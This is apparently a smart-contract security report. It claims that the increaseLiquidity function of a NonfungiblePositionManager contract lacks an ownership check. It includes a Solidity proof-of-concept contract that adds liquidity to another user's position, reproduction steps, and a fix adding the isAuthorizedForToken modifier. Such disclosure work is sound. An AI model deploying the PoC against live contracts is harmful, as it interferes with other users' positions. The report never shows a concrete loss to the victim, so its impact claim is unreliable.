### Impact
The increaseLiquidity function in the NonfungiblePositionManager contract lacks proper access control. 
Specifically, it is missing the isAuthorizedForToken(params.tokenId) modifier.

### Proof of Concept (PoC)
An unauthorized user can increase the liquidity of a position.
```Solidity
pragma solidity ^0.8.20;

import "./NonfungiblePositionManager.sol";

contract UnauthorizedLiquidityAdder {
    NonfungiblePositionManager public nonfungiblePositionManager;

    constructor(address _nonfungiblePositionManager) {
        nonfungiblePositionManager = NonfungiblePositionManager(_nonfungiblePositionManager);
    }

    function addLiquidityToAnotherPosition(
        uint256 targetTokenId,
        uint256 amount0Desired,
        uint256 amount1Desired
    ) external payable {
        NonfungiblePositionManager.IncreaseLiquidityParams memory params = NonfungiblePositionManager
            .IncreaseLiquidityParams({
                tokenId: targetTokenId,
                amount0Desired: amount0Desired,
                amount1Desired: amount1Desired,
                amount0Min: 0,
                amount1Min: 0,
                deadline: block.timestamp + 1 days
            });

        // Unauthorized increase of liquidity on a tokenId not owned by this contract
        nonfungiblePositionManager.increaseLiquidity{value: msg.value}(params);
    }
}
```
### Steps to Reproduce
1.	Deploy the NonfungiblePositionManager contract.
2.	Assume tokenId is owned by User A.
3.	User B deploys the UnauthorizedLiquidityAdder contract, passing the address of the NonfungiblePositionManager.
4.	User B calls addLiquidityToAnotherPosition with targetTokenId belonging to User A, along with desired liquidity amounts.
5.	The liquidity of User A’s position is increased without their consent.

## Recommended Mitigation Steps
Add the isAuthorizedForToken(params.tokenId) modifier to the increaseLiquidity function to enforce that only the owner or an authorized operator can call this function for a given tokenId.
```Solidity
function increaseLiquidity(
    IncreaseLiquidityParams calldata params
)
    external
    payable
    override
    isAuthorizedForToken(params.tokenId) // @Debo modifier added here
    checkDeadline(params.deadline)
    returns (uint128 liquidity, uint256 amount0, uint256 amount1)
{
    // Function body remains the same
}
```
